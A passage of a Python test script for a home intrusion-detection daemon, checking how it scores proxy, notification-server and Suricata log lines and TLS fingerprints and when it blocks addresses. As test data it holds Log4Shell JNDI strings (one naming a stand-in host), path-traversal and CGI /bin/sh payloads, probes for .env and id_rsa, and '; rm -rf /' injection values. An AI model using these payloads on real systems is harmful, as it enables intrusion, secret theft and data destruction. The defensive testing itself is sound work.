assert _after == ['2.2.2.2', '3.3.3.3', '4.4.4.4'], \
    'after a rotation the reading gave %r; the two lines before it were lost' % _after
# ...and our own server being down is said, once, and not weighed
_said = []
_was_notify, d.notify = d.notify, (lambda msg, level='info', **k: _said.append(msg))
_down = ['2026/09/16 16:10:%02d [error] 1#1: *%d connect() failed (111: Connection refused) while '
         'connecting to upstream, client: 46.227.172.22, server: ntfy.falco81.net, request: '
         '"GET /x HTTP/2.0", upstream: "http://127.0.0.1:2586/x%d", host: "ntfy.falco81.net"'
         % (_i, _i, _i) for _i in range(8)]
d.upstream_trouble(_down)
d.upstream_trouble(_down)
assert len(_said) == 1 and 'notification server' in _said[0], \
    'our own server being down was said %d time(s): %r' % (len(_said), _said[:2])
assert not d.proxy_weigh_errors(_down), 'our own server being down was weighed against somebody'
d.notify = _was_notify
d.proxy_run = _two_logs
zigmon.CONFIG['proxy_host'] = ''
# Who is really calling. The forwarded header is a chain a caller can start
# himself; only what a trusted proxy appended is worth believing, and that is
# at the RIGHT. Reading the front let a caller choose which address got the
# blame - the house's own phone, say - by sending the header himself.
zigmon.CONFIG['trusted_proxies'] = '192.168.43.17'
for _peer, _claimed, _want in (
        ('192.168.43.17', '89.24.57.142', '89.24.57.142'),
        ('5.5.5.5', '1.2.3.4', '5.5.5.5'),                          # a stranger's header: ignored
        ('192.168.43.17', '1.2.3.4, 89.24.57.142', '89.24.57.142'),  # the caller's own lie in front
        ('192.168.43.17', 'not-an-address', '192.168.43.17'),        # rubbish: the peer
        ('192.168.43.17', '89.24.57.142, 192.168.43.17', '89.24.57.142'),
        ('192.168.43.17', '', '192.168.43.17')):
    _got = d.caller_of(_peer, _claimed)
    assert _got == _want, 'peer %s with X-Forwarded-For %r was taken as %s, not %s' % (
        _peer, _claimed, _got, _want)
zigmon.CONFIG['trusted_proxies'] = ''
# ...and a fetched list may not contain the whole internet
for _wide in ('0.0.0.0/0', '::/0', '1.0.0.0/7', '2000::/15'):
    assert zigmon.range_of(_wide) is None, '%s was taken from a list; that is every address' % _wide
for _fine in ('10.0.0.0/8', '2000::/16', '45.9.148.0/24', '203.0.113.7'):
    assert zigmon.range_of(_fine) is not None, '%s was refused from a list' % _fine
# A lookup has to be a seek, not a scan: it runs for every line of every log,
# and with five lists in - sixty thousand ranges - walking every range below
# the address was a millisecond and a half apiece.
d.store.put_feed('probe', [_r for _r in (zigmon.range_of(_c) for _c in
                                         ('10.0.0.0/8', '45.9.148.0/24', '2001:db8::/32')) if _r])
for _ip, _want in (('10.255.255.255', True), ('11.0.0.1', False), ('45.9.148.9', True),
                   ('45.9.149.1', False), ('2001:db8:ffff::1', True), ('2001:db9::1', False)):
    _found = 'probe' in (d.store.feeds_with(_ip) or [])
    assert _found == _want, '%s was %s in a range it should %s be' % (
        _ip, 'found' if _found else 'not found', 'not' if _found else '')
_lots = []
for _i in range(20000):
    _lots.append(zigmon.range_of('%d.%d.%d.0/24' % (20 + _i // 65536, (_i // 256) % 256, _i % 256)))
d.store.put_feed('many', [_r for _r in _lots if _r])
_at = _time.time()
for _ in range(400):
    d.store.in_any_feed('45.9.148.9')
_each = (_time.time() - _at) / 400 * 1000
assert _each < 0.5, 'a lookup with twenty thousand ranges in takes %.2f ms; it is a scan' % _each
d.store.put_feed('many', [])
d.store.put_feed('probe', [])
# Shapes a real day at a real server showed, each of which looked like an
# ordinary refusal before: being asked to connect somewhere else, methods
# nobody uses on purpose, and somebody trying link secrets.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p',
                      'block_private': 'gently', 'feeds': ''})
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0


def _shape(ip, request, status, many=1):
    d.store.unblock(ip)
    d.forget_anomaly(ip)
    _lines = []
    for _i in range(many):
        _when = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - 120 + _i * 5))
        _lines.append('%s - - [%s] "%s" %s 0 "-" "-"' % (ip, _when, request, status))
    d.proxy_weigh(_lines)
    _c = [x for x in d.anomaly_state() if x['ip'] == ip]
    return ((_c[0]['score'] if _c else 0),
            (_c[0]['kinds'][0]['kind'] if _c and _c[0]['kinds'] else ''),
            any(r['ip'] == ip for r in d.blocked_list()))


for _ip, _req, _status, _many, _kind, _out in (
        ('45.9.148.40', 'CONNECT checkip.amazonaws.com:443 HTTP/1.1', 200, 2, 'proxy-open-proxy', True),
        ('45.9.148.41', 'SSTP_DUPLEX_POST /sra_x HTTP/1.1', 404, 2, 'proxy-open-proxy', True),
        ('45.9.148.42', 'PROPFIND / HTTP/1.1', 405, 3, 'proxy-odd-method', False),
        ('45.9.148.43', 'PRI * HTTP/2.0', 400, 3, 'proxy-odd-method', False),
        ('45.9.148.44', 'GET /tap/aa HTTP/1.1', 404, 3, 'proxy-guessing', True),
        ('45.9.148.45', 'GET /tap HTTP/1.1', 405, 3, 'proxy-knocking', False),
        ('45.9.148.46', 'GET /favicon.ico HTTP/1.1', 404, 3, 'proxy-knocking', False),
        # Asking for this machine's keys by name. Nothing links to these, so
        # nothing arrives at one by following a link: the asking is the whole
        # intent. Three days of the front server's log had 1,368 of them from
        # 27 addresses, and fourteen of those addresses were never kept out -
        # each asked a handful of times, scored 2 a time as "a path that is
        # not there", and stayed under the bar. One asked to run a shell.
        ('45.9.148.50', 'GET /.env HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        ('45.9.148.51', 'GET /.env.production HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        ('45.9.148.52', 'GET /.git/config HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        ('45.9.148.53', 'GET /api/.env HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        ('45.9.148.54', 'GET /actuator/env HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        ('45.9.148.55', 'GET /id_rsa HTTP/1.1', 404, 2, 'proxy-secret-hunt', True),
        # ...and a published break-in, asked for by name
        ('45.9.148.56', 'GET /owa/auth/logon.aspx HTTP/1.1', 404, 2, 'proxy-exploit', True),
        ('45.9.148.57', 'GET /geoserver/web/ HTTP/1.1', 404, 2, 'proxy-exploit', True),
        ('45.9.148.58', 'GET /solr/admin/info/system HTTP/1.1', 404, 2, 'proxy-exploit', True),
        ('45.9.148.59', 'GET /web/database/list HTTP/1.1', 400, 2, 'proxy-exploit', True),
        # What was asked for is read before how the front server answered: this
        # one arrived at a name the machine does not carry, so it was closed
        # with a 444 and written down as somebody walking addresses. It was
        # not - it was eight tries at a VPN login in two minutes.
        ('45.9.148.60', 'GET /remote/login?lang=en HTTP/1.1', 444, 2, 'proxy-exploit', True),
        # the second form of the Apache traversal, which the first form's
        # check did not see: it counted as an ordinary path that is not there,
        # for a request to run a shell
        ('45.9.148.61', 'GET /cgi-bin/%%32%65%%32%65/bin/sh HTTP/1.1', 400, 2, 'proxy-payload', True),
        # ...and one ask alone is still not enough to take somebody's address -
        # from a street of its own: next door to the ones just kept out, the
        # same ask a moment later is one tool on two addresses and is kept
        # out (4.85), and whether "a moment later" fell into the next second
        # decided whether this line passed
        ('45.9.177.62', 'GET /.env HTTP/1.1', 404, 1, 'proxy-secret-hunt', False)):
    _score, _got, _kept = _shape(_ip, _req, _status, _many)
    assert _got == _kind, '%r was read as %r, not %r' % (_req[:34], _got, _kind)
    assert _kept == _out, '%r %s kept out' % (_req[:34], 'was' if _kept else 'was not')
# ...and a press that worked is weighed at nothing at all
_score, _got, _kept = _shape('45.9.148.47', 'POST /tap HTTP/2.0', 200, 5)
assert _score == 0 and not _kept, 'five presses that worked weighed %d' % _score
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
# A press that WORKED from an address no link has been pressed from before is
# the one thing on this card that would mean a secret has walked, and it is
# said out loud - once per address, and never for a refusal or for the house.
_said = []
_was_notify, d.notify = d.notify, (lambda msg, level='info', **k: _said.append(msg))
d.store.set_meta('pressed_from', '[]')
_link = {'name': 'Osoby'}
for _who in ('89.24.57.142', '89.24.57.142', '37.48.19.38', '89.24.57.142', '37.48.19.38'):
    d.note_tap(_link, _who, 'header', 'done', 'done')
assert len(_said) == 1 and '37.48.19.38' in _said[0], \
    'a press from somewhere new was said %d time(s): %r' % (len(_said), _said[:2])
d.note_tap(_link, '5.5.5.5', 'header', 'refused', 'no')
d.note_tap(_link, '192.168.40.170', 'header', 'done', 'done')
_new_address = [m for m in _said if 'no link has been pressed from before' in m]
assert len(_new_address) == 1, \
    'a refusal, or the house itself, was said as somewhere new: %r' % _new_address[1:]
# ...and the refusal says its own thing, which is a different kind of message
_refusals = [m for m in _said if 'was refused' in m]
assert len(_refusals) == 1 and '5.5.5.5' in _refusals[0], \
    'a press refused was not said at all: %r' % _said
d.notify = _was_notify
d.store.set_meta('pressed_from', '[]')
print('a link pressed, and working, from somewhere new is said out loud once')
# The full log: one line of JSON per request, with the body and the headers.
# What it shows that an ordinary log cannot - and what it must NOT show.
_now_iso = time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime()) + \
    (lambda z: z[:3] + ':' + z[3:])(time.strftime('%z', time.localtime()))


def _full(**kw):
    _base = {'ip': '5.5.5.5', 't': _now_iso, 'm': 'POST', 'u': '/tap', 'proto': 'HTTP/2.0',
             's': 200, 'bytes': 0, 'took': 0.01, 'host': 'h', 'ua': 'Shortcuts', 'ref': '',
             'ct': 'application/json', 'clen': '42', 'body': '{"link":"Osoby"}',
             'secret': 'sent', 'code': 'none', 'xff': '', 'xfh': '', 'xou': '', 'xru': '',
             'xfp': '', 'origin': '', 'auth': '', 'cookie': '', 'te': '', 'exp': '', 'range': ''}
    _base.update(kw)
    return json.dumps(_base)


zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'block_private': 'never'})
for _ip, _line, _kind in (
        ('5.5.5.5', _full(), None),
        ('5.5.5.6', _full(ip='5.5.5.6', secret='none'), 'tap-no-secret'),
        ('5.5.5.7', _full(ip='5.5.5.7', ct='multipart/form-data; boundary=x'), 'tap-odd-body'),
        ('5.5.5.8', _full(ip='5.5.5.8', clen='4194304'), 'tap-odd-body'),
        ('5.5.5.9', _full(ip='5.5.5.9', xou='/admin'), 'proxy-header-trick'),
        ('5.5.6.1', _full(ip='5.5.6.1', body='${jndi:ldap://evil/x}'), 'proxy-payload'),
        ('5.5.6.2', _full(ip='5.5.6.2', body='../../etc/passwd'), 'proxy-payload'),
        ('5.5.6.3', _full(ip='5.5.6.3', m='TRACE', u='/', s=405, ct=''), 'proxy-odd-method')):
    d.store.unblock()
    d.forget_anomaly()
    d.full_weigh([_line])
    _c = [x for x in d.anomaly_state() if x['ip'] == _ip]
    # Every kind the line earned, not only the first of them: since 5.15 a
    # multipart body is weighed for being the shape PHP's own parser is
    # broken by as well as for being a body this road does not take, and
    # which of the two is written down first says nothing worth checking.
    _got = [k['kind'] for k in (_c[0]['kinds'] if _c else [])]
    if _kind is None:
        assert not _got, '%s was read as %r, when it is an ordinary press' % (_ip, _got)
    else:
        assert _kind in _got, '%s was read as %r, which does not include %r' % (_ip, _got, _kind)
# ...and that multipart press is weighed for both of the things it is
d.store.unblock()
d.forget_anomaly()
d.full_weigh([_full(ip='5.5.5.7', ct='multipart/form-data; boundary=x')])
_both = [k['kind'] for x in d.anomaly_state() if x['ip'] == '5.5.5.7' for k in x['kinds']]
assert 'tap-odd-body' in _both and 'proxy-multipart' in _both, \
    'a multipart press is not weighed for both of the things it is: %r' % (_both,)
# a body crafted to look like a second line stays one line, and is not
# attributed to the address it names
d.store.unblock()
d.forget_anomaly()
d.full_weigh([_full(ip='5.5.6.4', body='a\n5.5.6.9 - - "GET /x HTTP/1.1" 404')])
assert not [x for x in d.anomaly_state() if x['ip'] == '5.5.6.9'], \
    'a body pretending to be a log line was weighed against the address it named'
# and the reason says which header and what was in it
d.store.unblock()
d.forget_anomaly()
d.full_weigh([_full(ip='5.5.6.5', xou='/admin')])
_words = [x for x in d.anomaly_state() if x['ip'] == '5.5.6.5'][0]
assert 'X-Original-URL' in str(d._anomaly['5.5.6.5'][-1][2]), \
    'the reason does not say which header it was: %r' % (d._anomaly['5.5.6.5'][-1],)
d.store.unblock()
d.forget_anomaly()
zigmon.CONFIG['block_private'] = 'gently'      # as the checks after this expect
# The notification server's full log, by its own rules: it is an API with
# many roads, so the shape rules do not apply - somebody publishing a message
# legitimately sends any body at all - but a trick header, a body trying to be
# code, and arriving with no name and being refused for it all do.
def _ntfy_full(**kw):
    _b = {'ip': '7.7.7.1', 't': _now_iso, 'm': 'POST', 'u': '/zigmon-house', 's': 200, 'bytes': 0,
          'took': 0.01, 'host': 'n', 'ua': 'ntfy/1.7', 'ct': 'text/plain', 'clen': '12',
          'body': 'hello', 'secret': 'sent', 'auth': 'sent', 'which': 'ntfy',
          'xou': '', 'xfh': '', 'xru': ''}
    _b.update(kw)
    return json.dumps(_b)


for _ip, _line, _kind in (
        ('7.7.7.1', _ntfy_full(), None),
        ('7.7.7.2', _ntfy_full(ip='7.7.7.2', auth='none', s=401), 'ntfy-guess'),
        ('7.7.7.3', _ntfy_full(ip='7.7.7.3', s=429), 'proxy-flood'),
        ('7.7.7.4', _ntfy_full(ip='7.7.7.4', xou='/admin'), 'proxy-header-trick'),
        ('7.7.7.5', _ntfy_full(ip='7.7.7.5', body='${jndi:ldap://x}'), 'proxy-payload'),
        ('7.7.7.6', _ntfy_full(ip='7.7.7.6', clen='400000'), None)):
    d.store.unblock()
    d.forget_anomaly()
    d.full_weigh([_line])
    _c = [x for x in d.anomaly_state() if x['ip'] == _ip]
    _got = _c[0]['kinds'][0]['kind'] if _c and _c[0]['kinds'] else None
    assert _got == _kind, 'an ntfy line for %s was read as %r, not %r' % (_ip, _got, _kind)
d.store.unblock()
d.forget_anomaly()
# A press weighed where it ARRIVES, not where it is written down. The front
# server logs this road narrowly on purpose - the secret travels here - so the
# daemon does the looking, with every header in hand and none of them written
# anywhere.
_good = {'X-Zigmon-Tap': 'uPs_JPJ1DCGG', 'Content-Type': 'application/json',
         'Content-Length': '20', 'User-Agent': 'Shortcuts'}


def _press(ip, headers, body='{}'):
    """Every kind a press earned, or 'nothing'.

    All of them rather than the first: a multipart press is weighed both for
    being a body this road does not take and for being the shape PHP's own
    parser is broken by, and the order they are written down in says nothing.
    """
    d.store.unblock()
    d.forget_anomaly()
    d.weigh_press(ip, headers, '/api/tap', body)
    _c = [x for x in d.anomaly_state() if x['ip'] == ip]
    return [k['kind'] for k in (_c[0]['kinds'] if _c else [])] or ['nothing']


for _ip, _headers, _body, _kind in (
        ('5.1.1.1', _good, '{"ask":true}', 'nothing'),
        ('5.1.1.2', {k: v for k, v in _good.items() if k != 'X-Zigmon-Tap'}, '{}', 'tap-no-secret'),
        ('5.1.1.3', dict(_good, **{'X-Original-URL': '/admin'}), '{}', 'proxy-header-trick'),
        ('5.1.1.4', dict(_good, **{'X-Api-Version': '2'}), '{}', 'press-odd-header'),
        # the app's own, and what a proxy or a browser legitimately adds: the
        # allowlist was written from memory once, and the house kept out its
        # own dashboard for sending X-Zigmon-Via
        ('5.1.2.1', dict(_good, **{'X-Zigmon-Via': '192.168.40.170'}), '{}', 'nothing'),
        ('5.1.2.2', dict(_good, **{'X-Real-Ip': '37.48.19.38',
                                   'X-Forwarded-Proto': 'https'}), '{}', 'nothing'),
        ('5.1.2.3', dict(_good, **{'X-Requested-With': 'XMLHttpRequest'}), '{}', 'nothing'),
        ('5.1.1.5', _good, '{"link":"${jndi:ldap://x}"}', 'proxy-payload'),
        ('5.1.1.6', dict(_good, **{'Content-Type': 'multipart/form-data'}), '{}', 'tap-odd-body'),
        ('5.1.1.7', dict(_good, **{'Content-Length': '4194304'}), '{}', 'tap-odd-body'),
        # an argument nobody has declared is nobody's: 6.1.1.2 below presses
        # the same header after a link says it takes it
        ('5.1.1.8', dict(_good, **{'X-Zigmon-Arg-Room': 'kitchen'}), '{}', 'press-odd-header')):
    d._odd_header_said = {}
    _got = _press(_ip, _headers, _body)
    assert _kind in _got, 'a press from %s was read as %s, which does not include %s' \
        % (_ip, _got, _kind)
    if _kind == 'nothing':
        assert _got == ['nothing'], 'an ordinary press from %s was read as %s' % (_ip, _got)
# ...and the multipart press is weighed for both of the things it is
assert set(_press('5.1.1.6', dict(_good, **{'Content-Type': 'multipart/form-data'}))) >= \
    {'tap-odd-body', 'proxy-multipart'}, 'a multipart press is not weighed for both'
# What counts as a header this house sends is asked of the links, as they
# stand - not read from a list somebody typed into the program. An argument a
# link declares is its own; the same argument before anything declared it, and
# one nobody declared at all, are not.
# the links themselves are left alone - later checks press the real ones -
# so what the daemon reports as its links is stood in for, and put back
_real_taps = d.taps
d.taps = lambda: []
d._odd_header_said = {}
assert 'press-odd-header' in _press('6.1.1.1', dict(_good, **{'X-Zigmon-Arg-Room': 'kitchen'})), \
    'an argument no link takes was let by'
d.taps = lambda: [{'name': 'Lights', 'token': 't' * 20, 'target': 'tell', 'do': 'own',
                   'way': 'header', 'vars': [{'name': 'room', 'from': 'X-Zigmon-Arg-Room'}]}]
d._odd_header_said = {}
assert _press('6.1.1.2', dict(_good, **{'X-Zigmon-Arg-Room': 'kitchen'})) == ['nothing'], \
    'an argument a link declares was read as somebody\u2019s idea'
d._odd_header_said = {}
assert 'press-odd-header' in _press('6.1.1.3', dict(_good, **{'X-Zigmon-Arg-Hack': 'x'})), \
    'an argument nobody declared was let by because another one was'
d.taps = _real_taps
d._odd_header_said = {}
# An unfamiliar header is a thing to notice, never a thing to be sure about:
# most often it is a new phone, a new browser or a proxy nobody thought about.
# Weight one apiece still blocked, because trying lots of things adds bonuses
# on top - so it is said once an hour per address, not once per press.
d.store.unblock()
d.forget_anomaly()
d._odd_header_said = {}
for _i in range(20):
    d.weigh_press('5.1.3.1', dict(_good, **{'X-Api-Version': str(_i)}), '/api/tap', '{}')
assert not [r for r in d.blocked_list() if r['ip'] == '5.1.3.1'], \
    'twenty presses carrying an unfamiliar header kept a new phone out'
assert len(d._anomaly.get('5.1.3.1', [])) == 1, \
    'an unfamiliar header was noted %d times, not once' % len(d._anomaly.get('5.1.3.1', []))
# ...while the three that really do send a request elsewhere still do
d.store.unblock()
d.forget_anomaly()
for _i in range(3):
    d.weigh_press('5.1.3.2', dict(_good, **{'X-Original-URL': '/admin%d' % _i}), '/api/tap', '{}')
assert [r for r in d.blocked_list() if r['ip'] == '5.1.3.2'], \
    'three headers that send the request elsewhere did not keep anybody out'
# and nothing of the secret is kept anywhere by the weighing
_press('5.1.1.9', _good, '{}')
_kept = json.dumps([list(v) for v in d._anomaly.values()])
assert 'uPs_JPJ1DCGG' not in _kept, 'the weighing wrote the secret down'
d.store.unblock()
d.forget_anomaly()
print('a press is weighed where it arrives, every header of it, and none of it written down')
# Suricata's eve.json: it watches the packets this house never sees, says
# what it recognised and how sure it is, and the keeping out is still done
# here by the same weighing and the same ladder.
_eve_now = time.strftime('%Y-%m-%dT%H:%M:%S.000000%z', time.localtime())


def _eve(ip, sev, sig, cat='Attempted Administrator Privilege Gain', kind='alert'):
    return json.dumps({'timestamp': _eve_now, 'event_type': kind, 'src_ip': ip,
                       'dest_ip': '192.168.40.233', 'dest_port': 443, 'proto': 'TCP',
                       'alert': {'severity': sev, 'signature': sig, 'category': cat}})


zigmon.CONFIG.update({'suricata_least': 2, 'block_private': 'never'})
for _ip, _line, _kind in (
        ('8.1.1.1', _eve('8.1.1.1', 1, 'ET EXPLOIT Log4j RCE Attempt'), 'ids-serious'),
        ('8.1.1.2', _eve('8.1.1.2', 2, 'ET SCAN Suspicious inbound'), 'ids-likely'),
        # too unsure to weigh while the setting says two
        ('8.1.1.3', _eve('8.1.1.3', 3, 'ET INFO Observed DNS'), None),
        # classes that say plainly nothing is wrong, at any setting
        ('8.1.1.4', _eve('8.1.1.4', 2, 'x', cat='Not Suspicious Traffic'), None),
        ('8.1.1.5', _eve('8.1.1.5', 1, 'x', cat='Misc activity'), None),
        # a flow line is not an alert, and rubbish is rubbish
        ('8.1.1.6', _eve('8.1.1.6', 1, 'x', kind='flow'), None),
        # an alert about what THIS HOUSE sent is ours to fix, not anybody's to
        # answer for
        ('192.168.40.233', _eve('192.168.40.233', 1, 'ET EXPLOIT something'), None)):
    d.store.unblock()
    d.forget_anomaly()
    d.suricata_weigh([_line])
    _c = [x for x in d.anomaly_state() if x['ip'] == _ip]
    _got = _c[0]['kinds'][0]['kind'] if _c and _c[0]['kinds'] else None
    assert _got == _kind, 'an eve line for %s was read as %r, not %r' % (_ip, _got, _kind)
d.forget_anomaly()
d.suricata_weigh(['{not json at all', ''])          # must not throw
zigmon.CONFIG['suricata_least'] = 3
d.forget_anomaly()
d.suricata_weigh([_eve('8.1.1.3', 3, 'ET INFO Observed DNS')])
assert [x for x in d.anomaly_state() if x['ip'] == '8.1.1.3'], \
    'with everything asked for, a severity 3 was still not weighed'
zigmon.CONFIG['suricata_least'] = 2
d.store.unblock()
d.forget_anomaly()
d.suricata_weigh([_eve('8.1.1.7', 1, 'ET EXPLOIT one'), _eve('8.1.1.7', 1, 'ET EXPLOIT two')])
assert [r for r in d.blocked_list() if r['ip'] == '8.1.1.7'], \
    'two attacks Suricata knows by name did not keep anybody out'
d.store.unblock()
d.forget_anomaly()
zigmon.CONFIG['block_private'] = 'gently'
# Everything else the line carries and nobody was keeping: the rule that
# fired, what it says about itself, and - where the thing was HTTP - the host,
# the path and what it called itself. None of it is a payload, all of it is
# what Suricata recognised rather than what the caller sent.
d.forget_anomaly()
d.suricata_weigh([json.dumps({
    'timestamp': _eve_now, 'event_type': 'alert', 'src_ip': '9.9.9.9', 'dest_port': 443,
    'app_proto': 'http',
    'http': {'hostname': 'mqtt.falco81.net', 'url': '/x', 'http_user_agent': 'curl/8', 'status': 404},
    'alert': {'severity': 1, 'signature': 'ET EXPLOIT log4j', 'category': 'Misc Attack',
              'signature_id': 2034647, 'rev': 2,
              'metadata': {'confidence': ['High'], 'signature_severity': ['Major'],
                           'attack_target': ['Server'], 'cve': ['CVE_2021_44228']}}})])
_about = d._ids_about('9.9.9.9')
for _key, _want in (('sid', 2034647), ('rev', 2), ('confidence', 'High'),
                    ('attack_target', 'Server'), ('proto', 'http'),
                    ('host', 'mqtt.falco81.net'), ('agent', 'curl/8')):
    assert _about.get(_key) == _want, '%s came back as %r, not %r' % (_key, _about.get(_key), _want)
assert _about['links'][0]['where'] == 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228', \
    'the CVE link is wrong: %r' % _about.get('links')
# a CVE that is not one gets no link at all, rather than a made-up address
d.forget_anomaly()
d.suricata_weigh([json.dumps({
    'timestamp': _eve_now, 'event_type': 'alert', 'src_ip': '9.9.9.8', 'dest_port': 443,
    'alert': {'severity': 1, 'signature': 'x', 'category': 'Misc Attack',
              'metadata': {'cve': ['not-a-cve', '../../etc/passwd']}}})])
assert not d._ids_about('9.9.9.8').get('links'), \
    'something that is not a CVE was turned into a link'
d.store.unblock()
d.forget_anomaly()
# The rules file itself, asked one rule at a time: this is what turns
# "rule 2034647" into something worth reading.
_rule_line = ('alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET EXPLOIT Apache log4j RCE '
              'Attempt (CVE-2021-44228)"; content:"${jndi:ldap://"; nocase; content:"}"; '
              'reference:cve,2021-44228; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; '
              'classtype:attempted-admin; sid:2034647; rev:2;)')
zigmon.CONFIG.update({'proxy_host': 'p',
                      'suricata_rules': '/var/lib/suricata/rules/suricata.rules'})
d.proxy_run = lambda cmd, **k: _rule_line if '2034647' in cmd else ''
d._rules_said = {}
d.rules_fetch([2034647])          # it comes down with the logs, then is read here
_rule = d.rule_about(2034647)
assert _rule.get('classtype') == 'attempted-admin', 'the rule\u2019s class is wrong: %r' % _rule
assert 'log4j' in str(_rule.get('msg')), 'the rule\u2019s own words did not come through'
assert _rule.get('looks_for') and '${jndi:ldap://' in _rule['looks_for'], \
    'what the rule matches on did not come through: %r' % _rule.get('looks_for')
assert any(r['where'].startswith('https://nvd.nist.gov/') for r in (_rule.get('refs') or [])), \
    'the CVE reference on the rule did not become a link'
assert d.rule_about(2034647) is _rule, 'the same rule was read twice from the database'
assert d.rule_about(999999) == {}, 'a rule nobody has came back with something'
assert d.rule_about('; rm -rf /') == {}, 'rubbish for a rule number was taken as one'
# ...but a reference to the LIST the rule was built from is not about the
# address it just fired on: it is a file of a hundred thousand others, and the
# house already says which list knew it, in its own words.
for _sid, _line in (
        (2400015, 'alert ip x any -> y any (msg:"ET DROP Spamhaus DROP Listed Traffic Inbound '
                  'group 16"; reference:url,www.spamhaus.org/drop/drop.txt; sid:2400015; rev:1;)'),
        (2403371, 'alert ip x any -> y any (msg:"ET CINS Poor Reputation IP group 72"; '
                  'reference:url,www.cinsscore.com; sid:2403371; rev:1;)'),
        (2402000, 'alert ip x any -> y any (msg:"ET DROP Dshield Block Listed Source group 1"; '
                  'reference:url,feeds.dshield.org/block.txt; sid:2402000; rev:1;)')):
    d._rules_said = {}
    d.proxy_run = (lambda text: (lambda cmd, **k: text))(_line)
    d.store.db.execute('DELETE FROM ids_rules WHERE sid=?', (_sid,))
    d.store.db.commit()
    zigmon.CONFIG['suricata_rules'] = '/var/lib/suricata/rules/suricata.rules'
    d.rules_fetch([_sid])
    _got = d.rule_about(_sid)
    assert _got.get('msg'), 'the rule itself did not come through for %d' % _sid
    assert not _got.get('refs'), \
        'a link to the list the rule came from was kept for %d: %r' % (_sid, _got.get('refs'))
d.proxy_run = lambda cmd, **k: _rule_line if '2034647' in cmd else ''
# a path that is not a path is never handed to a shell
zigmon.CONFIG['suricata_rules'] = '/var/lib/suricata/rules/x.rules; rm -rf /'
d._rules_said = {}
assert d.rules_fetch([2034648]) == 0, 'a rules path with a semicolon in it was used anyway'
zigmon.CONFIG.update({'proxy_host': '', 'suricata_rules': ''})
d.proxy_run = _two_logs
# The TLS fingerprints, for the one thing they say that nothing else does:
# a hundred addresses sharing one is one tool on a hundred machines.
def _tls_line(ip, mark='t13d1516h2_8daaf6152771_02713d6af862'):
    return json.dumps({'timestamp': _eve_now, 'event_type': 'tls', 'src_ip': ip, 'dest_port': 443,
                       'tls': {'ja4': mark, 'sni': 'mqtt.falco81.net', 'version': 'TLS 1.3'}})


zigmon.CONFIG.update({'suricata_tls': 1, 'tls_spread_bar': 10, 'never_block': '',
                      'block_private': 'never'})
d.store.unblock()
d.forget_anomaly()
d._tls_seen, d._tls_said = {}, {}
d.tls_weigh([_tls_line('12.0.0.%d' % _i) for _i in range(9)])
assert not d.anomaly_state(), 'nine addresses on one fingerprint were weighed; ten is the bar'
d.tls_weigh([_tls_line('12.0.0.9')])
_all = d.anomaly_state()
assert len(_all) == 10, 'the tenth did not weigh all ten: %d' % len(_all)
assert _all[0]['kinds'][0]['kind'] == 'ids-same-tool', 'it was read as %r' % _all[0]['kinds'][0]['kind']
assert _all[0]['score'] == 3, 'one tool weighed %d apiece, not three' % _all[0]['score']
# ...and said once an hour, not on every line after that
d.tls_weigh([_tls_line('12.0.0.9')])
assert d.anomaly_state()[0]['score'] == 3, 'it was weighed again inside the hour'
# ten tools with one address each is nothing at all
d.forget_anomaly()
d._tls_seen, d._tls_said = {}, {}
d.tls_weigh([_tls_line('13.0.0.%d' % _i, 'fingerprint-%d-aaaaaaaa' % _i) for _i in range(10)])
assert not d.anomaly_state(), 'ten different tools were weighed as one'
# the house is never weighed for its own phones sharing a fingerprint
d.forget_anomaly()
d._tls_seen, d._tls_said = {}, {}
zigmon.CONFIG['never_block'] = '192.168.40.0/24'
d.tls_weigh([_tls_line('192.168.40.%d' % _i) for _i in range(20)])
assert not d.anomaly_state(), 'the house was weighed for its own devices sharing a fingerprint'
zigmon.CONFIG.update({'suricata_tls': 0, 'never_block': '', 'block_private': 'gently'})
d.forget_anomaly()
# ...and the other way round, which your own log showed: 85.217.149.10 opened
# twenty connections in one second wearing fifteen different fingerprints. No
# client does that - a browser has one hello and uses it.
d.forget_anomaly()
d.store.unblock()
d._tls_faces, d._tls_faced = {}, {}
zigmon.CONFIG['tls_faces_bar'] = 6
d.tls_weigh([_tls_line('85.217.149.10', 't13i%04d00_aaaaaaaaaaaa_bbbbbbbbbbbb' % _i)
             for _i in range(15)])
_faces = [x for x in d.anomaly_state() if x['ip'] == '85.217.149.10']
assert _faces and _faces[0]['kinds'][0]['kind'] == 'ids-many-faces', \
    'an address wearing fifteen fingerprints was read as %r' % (_faces and _faces[0]['kinds'][0]['kind'])
assert _faces[0]['score'] == 6, 'it weighed %d, not six' % _faces[0]['score']
# a phone reconnecting forty times with the same one is nothing
d.forget_anomaly()
d._tls_faces, d._tls_faced = {}, {}
d.tls_weigh([_tls_line('192.168.41.170', 't13d2013h2_a09f3c656075_7f0f34a4126d')
             for _ in range(40)])
assert not d.anomaly_state(), 'an address reconnecting with one fingerprint was weighed'
# and a browser with two or three over a minute is nothing either
d.forget_anomaly()
d._tls_faces, d._tls_faced = {}, {}
d.tls_weigh([_tls_line('9.9.9.9', 't13d20%02dh2_x_y' % _i) for _i in range(3)])
assert not d.anomaly_state(), 'three fingerprints from one address were weighed'
d.forget_anomaly()
d.store.unblock()
print('one address wearing many fingerprints is a tool measuring the server, and is seen')
print('one tool from many addresses is seen, and many tools from one each are not')
# The rules come down WITH the logs, in one grep for all the new ones, and
# everything afterwards reads the database. Asking the proxy once per row, at
# the moment somebody is looking at a card, was a hundred round trips twice a
# second on a road with nothing on screen to explain the wait.
_trips = [0]


def _one_grep(cmd, **kw):
    _trips[0] += 1
